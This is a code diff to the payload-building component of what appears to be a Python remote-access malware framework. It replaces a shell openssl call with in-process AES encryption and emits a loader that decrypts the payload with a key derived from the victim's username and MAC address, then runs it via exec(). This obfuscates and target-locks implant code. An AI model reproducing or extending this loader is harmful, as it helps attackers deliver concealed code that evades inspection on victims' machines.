@@ -12,6 +12,7 @@ import random
 import string
 import base64
 from textwrap import dedent
+from Cryptodome.Cipher import AES
 
 
 class Command:
@@ -289,12 +290,6 @@ class PayloadFactory:
                 else:
                     configured_payload += line
 
-        # AES-256 encrypt the configured payload with the client key
-        encrypt_command = "echo '%s' | openssl aes-256-cbc -a -salt -k %s -md sha256" % (
-            str(base64.b64encode(configured_payload.encode()), "utf-8"), client_key
-        )
-        encrypted = "".join(os.popen(encrypt_command).readlines()).replace("\n", "")
-
         # Return the loader which the stager will run
         return self._create_loader(loader_name, loader_options, payload_options, dedent("""\
         #!/usr/bin/env python
@@ -306,8 +301,51 @@ class PayloadFactory:
         def get_uid():
             return "".join(x.encode("hex") for x in (getpass.getuser() + "-" + str(uuid.getnode())))
         
-        exec("".join(os.popen("echo '{}' | openssl aes-256-cbc -A -d -a -k %s -md sha256 | base64 --decode" % get_uid()).readlines()))
-        """.format(encrypted)))
+        exec("".join(os.popen("echo '{}' | openssl aes-256-cbc -A -d -a -k %s -md md5" % get_uid()).readlines()))
+        """.format(self._openssl_encrypt(client_key, configured_payload).decode())))
+
+    def _openssl_encrypt(self, password, plaintext, msgdgst='md5'):
+        # Thanks to Joe Linoff:
+        # https://stackoverflow.com/a/42773185
+        salt = os.urandom(8)
+        key, iv = self._get_key_and_iv(password, salt, msgdgst=msgdgst)
+        if key is None:
+            return None
+
+        # PKCS#7 padding
+        padding_len = 16 - (len(plaintext) % 16)
+        if isinstance(plaintext, str):
+            padded_plaintext = plaintext + (chr(padding_len) * padding_len)
+        else:
+            padded_plaintext = plaintext + (bytearray([padding_len] * padding_len))
+
+        # Encrypt
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        cipher_text = cipher.encrypt(padded_plaintext.encode())
+
+        # Make OpenSSL compatible
+        openssl_ciphertext = b'Salted__' + salt + cipher_text
+        b64 = base64.b64encode(openssl_ciphertext)
+
+        return b64
+
+    @staticmethod
+    def _get_key_and_iv(password, salt, klen=32, ilen=16, msgdgst='md5'):
+        mdf = getattr(__import__('hashlib', fromlist=[msgdgst]), msgdgst)
+        password = password.encode('ascii', 'ignore')
+
+        try:
+            maxlen = klen + ilen
+            keyiv = mdf(password + salt).digest()
+            tmp = [keyiv]
+            while len(tmp) < maxlen:
+                tmp.append(mdf(tmp[-1] + password + salt).digest())
+                keyiv += tmp[-1]  # Append the last byte
+            key = keyiv[:klen]
+            iv = keyiv[klen:klen + ilen]
+            return key, iv
+        except UnicodeDecodeError:
+            return None, None
 
     def _create_loader(self, loader_name: str, loader_options: dict, payload_options: dict, payload: str) -> str:
         """Wraps the payload in the specified loader."""
